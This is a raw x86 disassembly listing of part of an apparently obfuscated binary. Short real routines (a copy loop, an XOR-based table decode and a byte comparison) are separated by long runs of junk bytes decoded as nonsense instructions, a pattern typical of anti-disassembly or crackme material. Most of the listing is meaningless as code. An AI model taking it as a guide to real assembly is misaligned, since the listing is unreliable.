  403288:	jno    0x4032fd
  40328a:	jg     0x4032f8
  40328c:	adc    BYTE PTR [ebx],0xb5
  40328f:	mov    ds:0x8a3f3ba0,eax
  403294:	mov    dh,0xd7
  403296:	jmp    DWORD PTR [edx+0x5b3229de]
  40329c:	js     0x403284
  40329e:	adc    ebx,DWORD PTR [esi+ecx*4]
  4032a1:	std    
  4032a2:	or     dh,BYTE PTR [edi-0x1b]
  4032a5:	call   eax
  4032a7:	xchg   esi,eax
  4032a8:	push   edi
  4032a9:	or     al,0xab
  4032ab:	test   DWORD PTR [eax+0x47679a78],0x8c1c6bf6
  4032b5:	push   edi
  4032b6:	mov    ah,0x5c
  4032b8:	sub    eax,0x39a8b1a0
  4032bd:	mov    bh,0x83
  4032bf:	jno    0x40332f
  4032c1:	pop    ss
  4032c2:	test   eax,0x2148e935
  4032c7:	xor    DWORD PTR [ebp-0x65],edx
  4032ca:	test   eax,0x6ce3b085
  4032cf:	mov    bl,0x9a
  4032d1:	int3   
  4032d2:	push   edx
  4032d3:	cwde   
  4032d4:	in     al,dx
  4032d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032d6:	xor    esp,DWORD PTR [esi+0x6bb54e6c]
  4032dc:	mov    edx,0x9a2f101a
  4032e1:	xchg   ecx,eax
  4032e2:	mov    edi,0x54116263
  4032e7:	xchg   edi,eax
  4032e8:	sub    eax,0x5531984d
  4032ed:	push   esp
  4032ee:	push   cs
  4032ef:	jno    0x4032d2
  4032f1:	sub    al,0x41
  4032f3:	imul   esi,DWORD PTR [ecx],0x42db99a6
  4032f9:	pop    ecx
  4032fa:	xor    eax,0xebc4ff9d
  4032ff:	adc    edi,DWORD PTR [eax-0x78f5a49]
  403305:	pop    es
  403306:	add    cl,cl
  403308:	or     BYTE PTR [ebx],0xc1
  40330b:	xchg   ebp,eax
  40330c:	jae    0x1224a0c6
  403312:	in     eax,dx
  403313:	pushf  
  403314:	mov    esp,0x79a1d1e3
  403319:	mov    bh,0xde
  40331b:	push   cs
  40331c:	call   0xa0a49545
  403321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403322:	and    DWORD PTR [eax-0x7304efed],0x47
  403329:	lahf   
  40332a:	inc    eax
  40332b:	pop    ebx
  40332c:	xchg   ecx,eax
  40332d:	and    BYTE PTR es:[edi-0x19],0x8
  403332:	mov    gs,WORD PTR [ebx]
  403334:	add    BYTE PTR [esi],al
  403336:	dec    edx
  403337:	mov    edx,DWORD PTR [ebx]
  403339:	shr    DWORD PTR [ebx-0x66fbbbed],cl
  40333f:	out    0xd9,al
  403341:	xchg   ebx,eax
  403342:	mov    cs,WORD PTR [esi-0x75]
  403345:	sub    DWORD PTR ds:0xbd3f9f06,ebp
  40334b:	push   ecx
  40334c:	and    edx,esi
  40334e:	call   0x50667036
  403353:	les    esi,FWORD PTR [eax]
  403355:	cld    
  403356:	sbb    edi,DWORD PTR [edi]
  403358:	dec    ecx
  403359:	aas    
  40335a:	sar    BYTE PTR [edx+ebx*1+0x4bc6e3b3],cl
  403361:	and    DWORD PTR [ecx],ecx
  403363:	xor    eax,0x3d22935f
  403368:	cmp    al,BYTE PTR [edx]
  40336a:	lods   eax,DWORD PTR ds:[esi]
  40336b:	push   ss
  40336c:	sub    esi,DWORD PTR ds:0x52b2a1c5
  403372:	and    al,0xef
  403374:	mov    ebp,0xa3b71482
  403379:	or     ebp,DWORD PTR [edi-0x6e1d0312]
  40337f:	std    
  403380:	lea    ecx,[esi-0x43cec046]
  403386:	inc    edi
  403387:	aam    0xa4
  403389:	in     al,0xc5
  40338b:	(bad)  
  40338c:	dec    esi
  40338d:	dec    esi
  40338e:	push   ebx
  40338f:	sti    
  403390:	push   ds
  403391:	test   al,0x6d
  403393:	xor    eax,0xafd3dde2
  403398:	mov    WORD PTR [edi+ecx*1],ds
  40339b:	mov    al,BYTE PTR [ebp-0x80]
  40339e:	std    
  40339f:	and    al,0x99
  4033a1:	scas   al,BYTE PTR es:[edi]
  4033a2:	and    DWORD PTR [eax+0x4a],esi
  4033a5:	fmul   QWORD PTR [edx-0x8]
  4033a8:	clc    
  4033a9:	inc    DWORD PTR [ecx+0x12657932]
  4033af:	cmp    ecx,DWORD PTR [edi]
  4033b1:	push   ebx
  4033b2:	push   eax
  4033b3:	nop
  4033b4:	and    BYTE PTR [edi],cl
  4033b6:	test   esi,esi
  4033b8:	mov    dl,0xec
  4033ba:	stos   DWORD PTR es:[edi],eax
  4033bb:	into   
  4033bc:	add    al,0xb5
  4033be:	(bad)  
  4033c0:	repnz adc BYTE PTR [esi],ch
  4033c3:	cmp    al,0xbd
  4033c5:	jbe    0x4033e9
  4033c7:	ins    BYTE PTR es:[edi],dx
  4033c8:	and    cl,0xc7
  4033cb:	int    0x2
  4033cd:	aas    
  4033ce:	inc    esi
  4033cf:	mov    esp,0xdf2b1700
  4033d4:	dec    ebp
  4033d5:	ret    
  4033d6:	das    
  4033d7:	sub    BYTE PTR [eax+0x73],dl
  4033da:	fwait
  4033db:	xchg   ebp,eax
  4033dc:	jmp    0xfded:0x310910c8
  4033e3:	mov    esp,0xbed019f4
  4033e8:	sar    DWORD PTR [eax],0xb8
  4033eb:	sahf   
  4033ec:	(bad)  
  4033ed:	fsub   DWORD PTR [ecx+eiz*2+0x4d]
  4033f1:	not    eax
  4033f3:	mov    ds:0x5c9cd61e,eax
  4033f8:	mov    esi,eax
  4033fa:	fistp  WORD PTR [ebx]
  4033fc:	shl    DWORD PTR [esi-0x467df544],1
  403402:	das    
  403403:	rcl    DWORD PTR [ecx],cl
  403405:	sbb    esi,esi
  403407:	(bad)  
  403409:	lock mov ah,0x36
  40340c:	pop    esp
  40340d:	mov    ds:0xc4d56789,eax
  403412:	stc    
  403413:	jle    0x40346b
  403415:	in     al,0xeb
  403417:	add    edi,DWORD PTR [esi+0x32729b]
  40341d:	neg    DWORD PTR ds:0x4302d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	jne    0x4033f0
  403454:	add    ecx,DWORD PTR [edx+0x7e7e1402]
  40345a:	scas   al,BYTE PTR es:[edi]
  40345b:	jg     0x4034db
  40345d:	jle    0x40346d
  40345f:	popa   
  403460:	pop    eax
  403461:	mov    bl,0x64
  403463:	in     al,0xd0
  403465:	sbb    ebp,DWORD PTR [esi-0x6f]
  403468:	ret    
  403469:	(bad)  
  40346a:	mov    dl,0xa6
  40346c:	mov    ecx,0x9d984e6
  403471:	sbb    al,0xca
  403473:	pop    edx
  403474:	dec    edx
  403475:	and    ch,BYTE PTR [edx+0x4e8a597f]
  40347b:	aaa    
  40347c:	or     al,0xba
  40347e:	push   esi
  40347f:	add    al,bl
  403481:	pop    eax
  403482:	sub    al,0xe5
  403484:	or     dh,BYTE PTR [esi+0x2d90f163]
  40348a:	cdq    
  40348b:	jb     0x403473
  40348d:	sbb    eax,0x70e51c64
  403492:	pop    ss
  403493:	jne    0x4034ef
  403495:	sbb    edi,DWORD PTR [edi]
  403497:	push   ds
  403498:	cdq    
  403499:	test   cl,bh
  40349b:	dec    esp
  40349c:	in     al,0xda
  40349e:	arpl   WORD PTR [edi],si
  4034a0:	cmp    eax,0xeb8e3e40
  4034a5:	fld    DWORD PTR [edx+0x2]
  4034a8:	and    dl,bh
  4034aa:	xor    cl,BYTE PTR [eax-0x1063182c]
  4034b0:	pop    es
  4034b1:	daa    
  4034b2:	aam    0x2c
  4034b4:	pop    edi
  4034b5:	jne    0x403500
  4034b7:	mov    DWORD PTR [edx+0x4bea512c],eax
  4034bd:	dec    eax
  4034be:	outs   dx,DWORD PTR ds:[esi]
  4034bf:	cmp    DWORD PTR [edi+ecx*8],ecx
  4034c2:	ret    
  4034c3:	scas   al,BYTE PTR es:[edi]
  4034c4:	jmp    0xb7e4:0xe49bc393
  4034cb:	clc    
  4034cc:	bound  ecx,QWORD PTR [eax-0x35]
  4034cf:	aas    
  4034d0:	bound  ebp,QWORD PTR ds:0x266900df
  4034d6:	adc    BYTE PTR [esi-0xa],bl
  4034d9:	cld    
  4034da:	or     eax,0x4172c0f4
  4034df:	test   ch,bl
  4034e1:	stos   BYTE PTR es:[edi],al
  4034e2:	shl    DWORD PTR [edi-0x7c152d1b],1
  4034e8:	xchg   esi,eax
  4034e9:	int3   
  4034ea:	adc    al,0xee
  4034ec:	sbb    BYTE PTR [ecx+0xb97021],0x13
  4034f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034f4:	(bad)  
  4034f5:	cdq    
  4034f6:	addr16 in eax,dx
  4034f8:	jno    0x4034da
  4034fa:	cmp    BYTE PTR [edi-0x5c],dh
  4034fd:	fcmovnbe st,st(6)
  4034ff:	push   ecx
  403500:	(bad)  
  403501:	repz and ax,0xa94c
  403506:	popf   
  403507:	xchg   edi,eax
  403508:	stos   BYTE PTR es:[edi],al
  403509:	test   BYTE PTR [edi+0x1496ca14],ch
  40350f:	sub    eax,DWORD PTR [edx+0x58]
  403512:	and    ah,ch
  403514:	inc    ecx
  403515:	xchg   esp,eax
  403516:	mov    al,gs:0xfc6c7e6a
  40351c:	push   ebp
  40351d:	daa    
  40351e:	(bad)  
  40351f:	in     al,dx
  403520:	mov    esp,0xa263a117
  403525:	xchg   ebp,eax
  403526:	int3   
  403527:	jo     0x403545
  403529:	or     ch,0xb6
  40352c:	fcom   DWORD PTR [ebp-0x47946bee]
  403532:	inc    BYTE PTR [esi+0x2cfd6b01]
  403538:	int3   
  403539:	xchg   esp,eax
  40353a:	test   ah,0x8b
  40353d:	test   DWORD PTR [eax-0x48],eax
  403540:	sbb    BYTE PTR [ebx-0x1a86008c],al
  403546:	sbb    dh,bh
  403548:	push   ss
  403549:	(bad)  
  40354a:	(bad)  
  40354b:	sbb    bh,BYTE PTR [edi]
  40354d:	test   ebx,esi
  40354f:	pop    ebx
  403550:	xchg   edi,eax
  403551:	push   ecx
  403552:	(bad)  ds:0xc40e665f
  403558:	mov    dh,0xdb
  40355a:	call   0xb0938c68
  40355f:	push   edx
  403560:	xchg   bl,ch
  403562:	enter  0xdf74,0x7
  403566:	aam    0x4b
  403568:	mov    ds:0xd6bfaaef,al
  40356d:	push   esp
  40356e:	inc    edi
  40356f:	sbb    ebx,DWORD PTR [ecx-0x32]
  403572:	pop    ecx
  403573:	sub    ecx,DWORD PTR [esi]
  403575:	xlat   BYTE PTR ds:[ebx]
  403576:	icebp  
  403577:	push   cs
  403578:	mov    edx,0xff4b165e
  40357d:	ret    
  40357e:	fs pop ebp
  403580:	out    dx,al
  403581:	ret    
  403582:	jmp    0x40351b
  403584:	inc    esp
  403585:	loope  0x4035a9
  403587:	mov    ds:0x5fd36640,eax
  40358c:	ins    DWORD PTR es:[edi],dx
  40358d:	test   al,0x89
  40358f:	mov    edi,0xc79dc192
  403594:	fist   DWORD PTR [ecx+0x57c5b5e7]
  40359a:	test   BYTE PTR [ebx],ah
  40359c:	neg    BYTE PTR [ebp+0xe]
  40359f:	mov    cl,0x5e
  4035a1:	xor    al,BYTE PTR [eax-0x70]
  4035a4:	rcr    DWORD PTR [ebx],0x7
  4035a7:	push   ebp
  4035a8:	adc    eax,0xbc358558
  4035ad:	test   eax,0x94b3013f
  4035b2:	mov    edx,0xa1aaa856
  4035b7:	js     0x403600
  4035b9:	scas   eax,DWORD PTR es:[edi]
  4035ba:	jno    0x4035d9
  4035bc:	daa    
  4035bd:	(bad)  
  4035be:	repnz xchg ebp,eax
  4035c0:	pop    ecx
  4035c1:	mov    BYTE PTR [eax+0x73c95d6],bh
  4035c7:	dec    ebx
  4035c8:	pop    es
  4035c9:	xor    al,BYTE PTR gs:[ecx-0x23]
  4035cd:	pop    ds
  4035ce:	call   0xb930858b
  4035d3:	xchg   al,dh
  4035d5:	hlt    
  4035d6:	cmp    ebx,esp
  4035d8:	es popf 
  4035da:	aam    0x40
  4035dc:	enter  0x82fe,0x7a
  4035e0:	std    
  4035e1:	aad    0x32
  4035e3:	push   cs
  4035e4:	mov    bl,BYTE PTR [ebx]
  4035e6:	sahf   
  4035e7:	fs jecxz 0x40361c
  4035ea:	and    esp,esi
  4035ec:	stos   BYTE PTR es:[edi],al
  4035ed:	mov    DWORD PTR [ebx],ecx
  4035ef:	js     0x40358f
  4035f1:	in     eax,dx
  4035f2:	je     0x403625
  4035f4:	pop    ebx
  4035f5:	and    bh,bh
  4035f7:	sbb    esp,DWORD PTR [ecx]
  4035f9:	lods   al,BYTE PTR ds:[esi]
  4035fa:	mov    esp,eax
  4035fc:	je     0x4035f5
  4035fe:	pop    ds
  4035ff:	push   ecx
  403600:	stc    
  403601:	mov    al,0xd6
  403603:	sti    
  403604:	adc    BYTE PTR [ebp+0x51],0xbb
  403608:	fstp   st(0)
  40360a:	jecxz  0x403636
  40360c:	inc    eax
  40360d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40360e:	xor    edx,ecx
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x603dd7c8
  40366f:	mov    es,ecx
  403671:	dec    eax
  403672:	mov    dl,0x15
  403674:	jle    0x4036f4
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x40362e
  40367b:	retf   0x7bf6
  40367e:	push   esp
  40367f:	xchg   edx,eax
  403680:	fldcw  WORD PTR [ebp-0x6f2bd471]
  403686:	std    
  403687:	sbb    eax,0x64f96997
  40368c:	lods   eax,DWORD PTR ds:[esi]
  40368d:	xchg   esp,eax
  40368e:	fild   WORD PTR [edx+eiz*2]
  403691:	cs in  eax,0xe4
  403694:	or     al,0xcd
  403696:	int3   
  403697:	in     eax,0x47
  403699:	test   BYTE PTR [ecx],0xdd
  40369c:	outs   dx,BYTE PTR ds:[esi]
  40369d:	mov    ch,0xe8
  40369f:	or     BYTE PTR [ebx+eiz*1+0x11681d3d],bl
  4036a6:	or     ah,dh
  4036a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036a9:	dec    edi
  4036aa:	imul   eax,DWORD PTR [edi+0x2e],0x8c00bfc8
  4036b1:	mov    ds,WORD PTR [esi]
  4036b3:	push   ss
  4036b4:	mov    bh,0x25
  4036b6:	lods   eax,DWORD PTR ds:[esi]
  4036b7:	fld    QWORD PTR [ecx-0x362d608f]
  4036bd:	mov    ds:0x496a8681,eax
  4036c2:	jmp    0x403672
  4036c4:	aaa    
  4036c5:	call   0xfe69:0x6b2b129e
  4036cc:	push   ebp
  4036cd:	outs   dx,BYTE PTR ds:[esi]
  4036ce:	and    esp,ecx
  4036d0:	(bad)  
  4036d2:	enter  0x7101,0x9
  4036d6:	ins    BYTE PTR es:[edi],dx
  4036d7:	fdivp  st(7),st
  4036d9:	scas   al,BYTE PTR es:[edi]
  4036da:	aad    0x51
  4036dc:	loop   0x403734
  4036de:	scas   eax,DWORD PTR es:[edi]
  4036df:	jns    0x403698
  4036e1:	or     bh,BYTE PTR [ebx+ebp*8]
  4036e4:	sar    dh,cl
  4036e6:	mov    esi,0x795f5939
  4036eb:	je     0x4036b2
  4036ed:	gs add al,al
  4036f0:	test   eax,0x2311d64c
  4036f5:	js     0x403766
  4036f7:	xchg   esp,eax
  4036f8:	pop    ecx
  4036f9:	cmp    DWORD PTR cs:[edx],0xffffffc5
  4036fd:	pop    ebp
  4036fe:	hlt    
  4036ff:	test   al,0x6
  403701:	stos   BYTE PTR es:[edi],al
  403702:	push   ebx
  403703:	mov    al,0x67
  403705:	sub    edi,eax
  403707:	dec    esp
  403708:	test   BYTE PTR [ecx],dh
  40370a:	out    0x87,eax
  40370c:	push   ss
  40370d:	sbb    eax,0xa408dc5d
  403712:	imul   esi,DWORD PTR [eax+esi*4-0x1976c821],0xc88e5fe
  40371d:	mov    ss,WORD PTR [ebx]
  40371f:	sahf   
  403720:	mov    ds:0xf6f99877,al
  403725:	aam    0x60
  403727:	je     0x403759
  403729:	push   cs
  40372a:	push   0x286924
  40372f:	mov    eax,ds:0x185f22bb
  403734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403735:	es bswap ebp
  403738:	iret   
  403739:	retf   
  40373a:	jmp    0x4e3b:0x3e795038
  403741:	adc    al,0xad
  403743:	adc    DWORD PTR [ebp-0x13],edx
  403746:	ss push esi
  403748:	std    
  403749:	in     eax,dx
  40374a:	fisttp WORD PTR [edx+0x49ea91ab]
  403750:	cmp    dh,BYTE PTR [esi]
  403752:	js     0x40371c
  403754:	xor    BYTE PTR [edx-0x1e],0xe0
  403758:	fild   DWORD PTR [ecx-0x51]
  40375b:	(bad)  
  40375c:	std    
  40375d:	dec    ebx
  40375e:	call   DWORD PTR [ecx+edx*8+0x13]
  403762:	jecxz  0x403763
  403764:	dec    edx
  403765:	mov    ecx,0x6595ff01
  40376a:	pop    edi
  40376b:	lds    edi,FWORD PTR [edx+0x7852ea4d]
  403771:	mov    cl,0xfc
  403773:	push   edx
  403774:	in     al,0x4c
  403776:	iret   
  403777:	mov    esi,DWORD PTR [ebx-0x49d1d7fe]
  40377d:	stos   BYTE PTR es:[edi],al
  40377e:	es out dx,eax
  403780:	add    bl,BYTE PTR [edx-0x481de61f]
  403786:	or     DWORD PTR [edi+ebx*8-0x6],edi
  40378a:	icebp  
  40378b:	cmp    eax,0xe3530d1b
  403790:	jb     0x4037bb
  403792:	out    0x3f,eax
  403794:	sub    al,0xbb
  403796:	push   edx
  403797:	or     DWORD PTR [esi+0x6d],ecx
  40379a:	inc    ebx
  40379b:	loope  0x403738
  40379d:	pop    ss
  40379e:	or     eax,0xeed27e14
  4037a3:	stos   BYTE PTR es:[edi],al
  4037a4:	pop    esi
  4037a5:	hlt    
  4037a6:	dec    ebx
  4037a7:	es in  eax,dx
  4037a9:	sub    eax,0xe4ff6398
  4037ae:	imul   ecx,DWORD PTR [eax-0x68acf5e8],0x7cab57c0
  4037b8:	imul   esp,DWORD PTR [eax+0x5df3c50a],0x39
  4037bf:	pusha  
  4037c0:	pop    eax
  4037c1:	(bad)  
  4037c3:	jecxz  0x4037f7
  4037c5:	das    
  4037c6:	jecxz  0x4037e3
  4037c8:	add    al,0xb4
  4037ca:	xor    DWORD PTR [esp+edx*8],esi
  4037cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ce:	pop    ds
  4037cf:	sub    DWORD PTR [esi+0x8],edi
  4037d2:	fisttp DWORD PTR [eax]
  4037d4:	test   BYTE PTR [edi],bh
  4037d6:	ss out dx,eax
  4037d8:	sbb    DWORD PTR [ecx],0x702e278d
  4037de:	test   dl,0xca
  4037e1:	dec    edi
  4037e2:	xor    ebp,DWORD PTR [edi]
  4037e4:	retf   
  4037e5:	cpuid  
  4037e7:	jge    0x4037cb
  4037e9:	rcr    DWORD PTR [ecx+esi*1+0x22ed00cd],cl
  4037f0:	adc    eax,0x8d829d38
  4037f5:	sar    BYTE PTR [ebp+0x68bba374],cl
  4037fb:	mov    edi,DWORD PTR [edi+0x5981d4f9]
  403801:	dec    BYTE PTR [ecx+0x7cec829d]
  403807:	adc    esi,DWORD PTR [edi-0x67db6e20]
  40380d:	adc    eax,ebp
  40380f:	mov    esi,0x22830ee
  403814:	mov    edx,0x186ceab
  403819:	adc    cl,BYTE PTR [edx+eiz*8-0xf1254e2]
  403820:	enter  0x9328,0x5a
  403824:	or     DWORD PTR [ecx+edx*1-0x52],ebp
  403828:	imul   edi,DWORD PTR [ecx-0x75],0xc1331055
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0xd0dfe523
  403845:	hlt    
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x4037ef
  40384f:	pop    ebp
  403850:	or     al,0x54
  403852:	mov    ah,0x78
  403854:	xchg   edi,eax
  403855:	inc    ebp
  403856:	std    
  403857:	and    al,0x4e
  403859:	test   al,0xbb
  40385b:	mov    edx,0x33abb463
  403860:	dec    ecx
  403861:	push   es
  403862:	xchg   DWORD PTR [esi-0x39],ebx
  403865:	or     DWORD PTR [edi-0x5a],ebp
  403868:	retf   0xb9de
  40386b:	mov    esp,0xb3ddc39c
  403870:	mov    eax,0xfe689dfa
  403875:	adc    al,0x27
  403877:	and    edx,ebx
  403879:	jo     0x40386d
  40387b:	dec    esi
  40387c:	pop    esi
  40387d:	jle    0x403827
  40387f:	aas    
  403880:	pop    ecx
  403881:	das    
  403882:	dec    eax
  403883:	shl    DWORD PTR [edx+0x3f],cl
  403886:	jb     0x40387a
  403888:	or     dh,BYTE PTR [ebx+0x7d99e786]
  40388e:	fistp  WORD PTR [ecx]
  403890:	lods   eax,DWORD PTR ds:[esi]
  403891:	lock xor eax,0xf41b48c6
  403897:	imul   ecx,DWORD PTR [ebx+0x7e],0xffffffba
  40389b:	popf   
  40389c:	aas    
  40389d:	rcl    DWORD PTR [edx+0x45e3d417],1
  4038a3:	pop    edx
  4038a4:	and    esp,DWORD PTR [edi]
  4038a6:	pop    eax
  4038a7:	jnp    0x4038c6
  4038a9:	sbb    dl,BYTE PTR [edx]
  4038ab:	outs   dx,DWORD PTR ds:[esi]
  4038ac:	and    al,0xdc
  4038ae:	sbb    ebp,esp
  4038b0:	in     al,dx
  4038b1:	lds    ebx,FWORD PTR [edi]
  4038b3:	jb     0x403883
  4038b5:	loope  0x403867
  4038b7:	fwait
  4038b8:	clc    
  4038b9:	inc    ecx
  4038ba:	add    ecx,eax
  4038bc:	hlt    
  4038bd:	clc    
  4038be:	pop    ebp
  4038bf:	rol    DWORD PTR [edi],0x28
  4038c2:	pop    ecx
  4038c3:	(bad)  
  4038c5:	sahf   
  4038c6:	add    al,0x19
  4038c8:	inc    BYTE PTR [ebp+0x43e35f4f]
  4038ce:	outs   dx,BYTE PTR ds:[esi]
  4038cf:	sub    BYTE PTR [eax+0x27],0xed
  4038d3:	push   edi
  4038d4:	div    ebx
  4038d6:	adc    eax,DWORD PTR [ebp+0x29]
  4038d9:	mov    bh,0x9e
  4038db:	push   edi
  4038dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038dd:	rcr    BYTE PTR [ecx+ebx*1-0x2892c91f],cl
  4038e4:	jmp    0x4b3d:0x65f43cc2
  4038eb:	adc    esi,edx
  4038ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038ee:	or     eax,DWORD PTR [ebx+0x6f881cbc]
  4038f4:	cmp    esp,DWORD PTR [edi]
  4038f6:	xor    BYTE PTR [ebp-0x29],bh
  4038f9:	dec    ebx
  4038fa:	rcr    BYTE PTR [edx+edx*4],cl
  4038fd:	jp     0x40394e
  4038ff:	out    dx,al
  403900:	(bad)  
  403901:	jae    0x4038c6
  403903:	test   bh,al
  403905:	push   ebx
  403906:	pop    ss
  403907:	fild   WORD PTR [edx+esi*4-0x7ec799a8]
  40390e:	pop    ecx
  40390f:	xchg   ebx,eax
  403910:	cli    
  403911:	mov    dl,0xe6
  403913:	jp     0x40389e
  403915:	add    ch,BYTE PTR [eax]
  403917:	mov    ecx,0x288d5cc3
  40391c:	sub    al,0xa5
  40391e:	fcmovb st,st(1)
  403920:	inc    ecx
  403921:	call   0xfb104d38
  403926:	nop
  403927:	daa    
  403928:	xchg   DWORD PTR ds:0xc0fb3817,edi
  40392e:	dec    esp
  40392f:	(bad)  
  403930:	mov    esp,0xbd5f4622
  403935:	in     al,dx
  403936:	sahf   
  403937:	int    0x6f
  403939:	push   ds
  40393a:	sbb    DWORD PTR [ebx],0xfffffffd
  40393d:	xor    edi,ebx
  40393f:	push   eax
  403940:	aas    
  403941:	cmp    ebx,edi
  403943:	aam    0x7a
  403945:	fimul  WORD PTR [ebp+0x4bddb58]
  40394b:	lods   eax,DWORD PTR ds:[esi]
  40394c:	fwait
  40394d:	xchg   ecx,esp
  40394f:	sbb    eax,0x6aa28615
  403954:	and    al,0xf8
  403956:	adc    al,0xd2
  403958:	jns    0x4039b5
  40395a:	xchg   ecx,eax
  40395b:	das    
  40395c:	popf   
  40395d:	es xchg ebx,eax
  40395f:	sub    eax,0x84de2f79
  403964:	push   edx
  403965:	pop    es
  403966:	(bad)  
  403967:	push   esp
  403968:	dec    edi
  403969:	gs xor al,0xe3
  40396c:	arpl   WORD PTR [ebx-0x3255e80],bp
  403972:	mov    WORD PTR [ecx-0x43],?
  403975:	iret   
  403976:	pop    eax
  403977:	add    eax,0xdc34c8e5
  40397c:	cli    
  40397d:	pop    ecx
  40397e:	or     eax,0xd3f41811
  403983:	and    eax,0x5142a9e5
  403988:	cmp    eax,0x8380ea9c
  40398d:	(bad)  
  40398f:	or     DWORD PTR [esi+eiz*2+0x73fd6d39],esp
  403996:	in     al,0x76
  403998:	into   
  403999:	mov    eax,DWORD PTR ds:[ecx]
  40399c:	in     al,0x1d
  40399e:	xchg   esp,eax
  40399f:	pushf  
  4039a0:	mov    eax,0xe269374a
  4039a5:	inc    ecx
  4039a6:	mov    BYTE PTR [ebp-0x36],cl
  4039a9:	shr    BYTE PTR [eax],0x45
  4039ac:	and    dl,dl
  4039ae:	fwait
  4039af:	mov    ds:0xb301efdb,al
  4039b4:	dec    ecx
  4039b5:	jne    0x4039ec
  4039b7:	jo     0x403979
  4039b9:	xchg   edi,eax
  4039ba:	pop    ebp
  4039bb:	or     BYTE PTR [esi],dh
  4039bd:	xor    DWORD PTR [edi+0x42],0xed48865f
  4039c4:	das    
  4039c5:	call   0xc9f4:0xc9d9eec3
  4039cc:	idiv   BYTE PTR [esi+ebx*2-0x1d]
  4039d0:	lods   al,BYTE PTR ds:[esi]
  4039d1:	xchg   ebp,eax
  4039d2:	loope  0x4039f8
  4039d4:	mov    esp,0xebf33d2
  4039d9:	mov    edx,0x3a8afdfe
  4039de:	pop    eax
  4039df:	or     bh,BYTE PTR [ebx+0x16]
  4039e2:	pop    ecx
  4039e3:	lods   eax,DWORD PTR ds:[esi]
  4039e4:	cmp    edx,esp
  4039e6:	inc    esi
  4039e7:	adc    DWORD PTR [eax],edx
  4039e9:	cs aam 0x7e
  4039ec:	jge    0x403a51
  4039ee:	(bad)  
  4039f0:	pop    ecx
  4039f1:	push   ss
  4039f2:	jbe    0x403a2d
  4039f4:	push   ebp
  4039f5:	std    
  4039f6:	fld    TBYTE PTR [ecx]
  4039f8:	push   eax
  4039f9:	fmul   DWORD PTR [ebp-0x7684ff35]
  4039ff:	add    cl,BYTE PTR [ebx-0x3ecc07bb]
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0x6e7bc1ef
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a83
  403a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a5c:	and    al,0x19
  403a5e:	mov    ah,0xb
  403a60:	int3   
  403a61:	sbb    BYTE PTR [edi],al
  403a63:	inc    edx
  403a64:	xor    al,0xdc
  403a66:	int    0x4e
  403a68:	aas    
  403a69:	xlat   BYTE PTR ds:[ebx]
  403a6a:	inc    edx
  403a6b:	sub    al,0xc0
